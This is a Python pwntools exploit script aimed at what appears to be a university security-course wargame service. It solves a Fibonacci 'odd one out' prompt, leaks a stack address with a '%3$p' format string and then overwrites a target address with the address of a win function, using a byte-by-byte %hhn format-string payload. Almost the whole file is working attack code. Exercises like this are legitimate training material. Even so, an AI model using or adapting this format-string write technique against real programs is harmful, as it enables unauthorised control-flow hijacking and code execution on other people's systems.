#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *


def get_fib_sequence():
    prev = 0
    curr = 1
    ret = [prev, curr]

    for i in range(1, 25):
        temp = curr
        curr = prev+curr
        prev = temp
        ret += [curr]
    return ret


def get_wrong(l):
    fibs = get_fib_sequence()
    for i, dig in enumerate(l):
        if int(dig) not in fibs:
            return i
    return 0


def do_change_name(r, new_name):
    r.sendline('c')
    r.sendline(new_name)


def do_gamble(r):
    r.sendline('g')
    r.sendline('0.0000000001')
    r.recvuntil('Pick the odd one out:')
    resp = r.recvrepeat(0.2)
    resp = resp.split('\n')
    resp = [a[3:] for a in resp if a[3:]]

    print resp, get_wrong(resp)

    wrong = get_wrong(resp)
    r.sendline(str(wrong+1))
    r.recvuntil("Well done, ")
    resp = r.recvline()
    r.sendline()
    resp = resp.split('!')

    return resp[0]


def calculate_value(a, b):
    tmp = abs(a-b)
    if a > b:
        return 0x100-tmp
    return tmp


def main():
    target = "wargames.6447.sec.edu.au"
    port = "7003"

    r = remote(target, port)

    r.sendline('%3$p')
    resp = do_gamble(r)
    print "recovered address = ", resp
    win = int(resp, 16) - 2883
    target = win + 14172
    win = hex(win)

    win = [int(win[i:i+2], 16) for i in range(2, len(win), 2)][::-1]

    payload = (
        p32(target)
        + p32(target + 1)
        + p32(target + 2)
        + p32(target + 3)
        + '%{}c%9$hhn%{}c%10$hhn%{}c%11$hhn%{}c%12$hhn'.format(
            win[0] - 16,
            calculate_value(win[0], win[1]),
            calculate_value(win[1], win[2]),
            calculate_value(win[2], win[3])
        )
    )

    print payload

    do_change_name(r, payload)

    resp = r.recvrepeat(0.2)
    print resp
    resp = do_gamble(r)
    print resp


if __name__ == '__main__':
    main()
